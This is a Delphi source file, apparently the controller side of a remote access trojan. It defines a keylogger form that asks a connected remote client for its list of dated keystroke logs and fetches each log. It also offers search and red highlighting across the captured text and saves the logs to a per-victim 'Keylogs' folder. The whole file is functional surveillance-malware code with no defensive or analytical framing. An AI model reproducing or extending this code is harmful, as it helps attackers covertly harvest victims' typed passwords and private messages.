unit ClientKeylogger;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, uTypes,
  Dialogs, StdCtrls, ComCtrls, ExtCtrls, uFunctions;

type
  TKeyloggerForm = class(TCForm)
    LogList: TListBox;
    Panel1: TPanel;
    Panel2: TPanel;
    Search: TEdit;
    SearchOne: TButton;
    SearchAll: TButton;
    SaveLog: TButton;
    Viewer: TRichEdit;
    procedure LogListClick(Sender: TObject);
    procedure FormCreate(Sender: TObject);

    procedure SearchOneClick(Sender: TObject);
    procedure SearchAllClick(Sender: TObject);
    procedure FormKeyPress(Sender: TObject; var Key: Char);
    procedure SaveLogClick(Sender: TObject);
  private
    { Private declarations }
  public
    procedure ExecuteThread(CMD: string = ''); override;
  end;

var
  KeyloggerForm: TKeyloggerForm;
  StartPos: Integer;
  StoreAllMark: TStringList;

implementation

uses Math;

{$R *.dfm}

procedure TKeyloggerForm.ExecuteThread(CMD: string = '');
var
  MS: TMemoryStream;
  SL: TStringList;
  Size, i: Integer;
  R: string;
  X: TFormatSettings;
begin
  MS := TMemoryStream.Create;
  SL := TStringList.Create;

  if CMD = 'log_list' then begin
    Size := Client.ReadInteger;
    Client.ReadStream(MS, Size);
    SL.LoadFromStream(MS);

    if SL.Count > 0 then begin
      for i := 0 to SL.Count - 1 do begin
        R := SL.Strings[i];
        R[3] := '/';
        R[4] := '/';
        R := StringReplace(R, '//', '/' + SL.Strings[i][3] + SL.Strings[i][4] + '/', [rfReplaceAll]);
        X.ShortDateFormat := 'DD/MM/YY';
        X.DateSeparator := '/';
        LogList.Items.Add(DateToStr(StrToDate(R, X)));
      end;
    end;
  end;

  if CMD = 'log_view' then begin
    Size := Client.ReadInteger;
    Client.ReadStream(MS, Size);
    SL.LoadFromStream(MS);

    if SL.Count > 0 then begin
      Viewer.Clear;
      Viewer.Lines.AddStrings(SL);
    end;
  end;

  MS.Free;
  SL.Free;
end;

{****************************************************************************
                              Keylogger Functions
****************************************************************************}

procedure TKeyloggerForm.FormCreate(Sender: TObject);
begin
  Client.WriteLn('log_list');
end;

procedure TKeyloggerForm.LogListClick(Sender: TObject);
begin
  Client.WriteLn('log_view');
  Client.WriteLn(FormatDateTime('DDMMYY', StrToDate(LogList.Items[LogList.ItemIndex])));
end;

procedure MarkString(RichEdit: TRichEdit; StrToMark: string);
var
  FoundAt: integer;
begin
  FoundAt := RichEdit.FindText(StrToMark, 0, maxInt, [stMatchCase]);
  while FoundAt <> -1 do
  begin
    RichEdit.SelStart := FoundAt;
    RichEdit.SelLength := Length(StrToMark);
    RichEdit.SelAttributes.Style := [fsBold];
    RichEdit.SelAttributes.Color := clRed;
    RichEdit.SelText := StrToMark;
    FoundAt := RichEdit.FindText(strtomark, FoundAt + length(StrToMark), maxInt, [stMatchCase]);
  end;
end;

procedure UnMarkString(RichEdit: TRichEdit; StrToMark: string);
var
  FoundAt: integer;
begin
  FoundAt := RichEdit.FindText(StrToMark, 0, maxInt, [stMatchCase]);
  while FoundAt <> -1 do
  begin
    RichEdit.SelStart := FoundAt;
    RichEdit.SelLength := Length(StrToMark);
    RichEdit.SelAttributes.Style := [];
    RichEdit.SelAttributes.Color := clBlack;
    RichEdit.SelText := StrToMark;
    FoundAt := RichEdit.FindText(strtomark, FoundAt + length(StrToMark), maxInt, [stMatchCase]);
  end;
end;

procedure TKeyloggerForm.SearchOneClick(Sender: TObject);
var
  FoundAt: Integer;
begin
  if Length(Search.Text) > 2 then
    with Viewer do
    begin
      if SelLength <> 0 then StartPos := SelStart + SelLength
      else StartPos := 0;

      FoundAt := FindText(Search.Text, StartPos, maxInt, [stMatchCase]);
      if FoundAt <> -1 then
      begin
        SetFocus;
        SelStart := FoundAt;
        SelLength := Length(Search.Text);
        Perform(EM_SCROLLCARET, 0,0);
      end
      else Beep;
    end;
end;

procedure TKeyloggerForm.SearchAllClick(Sender: TObject);
begin
  if not Assigned(StoreAllMark) then
    StoreAllMark := TStringList.Create;

  if Length(Search.Text) > 2 then begin
    StoreAllMark.Add(Search.Text);
    MarkString(Viewer, Search.Text);
  end;
end;

procedure TKeyloggerForm.FormKeyPress(Sender: TObject; var Key: Char);
var
  i: Integer;
begin
  if Key = #27 then
    if Assigned(StoreAllMark) then begin
      for i := 0 to StoreAllMark.Count - 1 do begin
        UnMarkString(Viewer, StoreAllMark.Strings[i]);
      end;
      StoreAllMark.Clear;
    end;

  if Key = #13 then
    SearchOneClick(Self);
end;

procedure TKeyloggerForm.SaveLogClick(Sender: TObject);
var
  SL : TStringList;
begin
  SL := TStringList.Create;
  SL.AddStrings(Viewer.Lines);
  SL.SaveToFile(UserFolder(Client.Data, 'txt', 'Keylogs'));
  SL.Free;
end;

end.

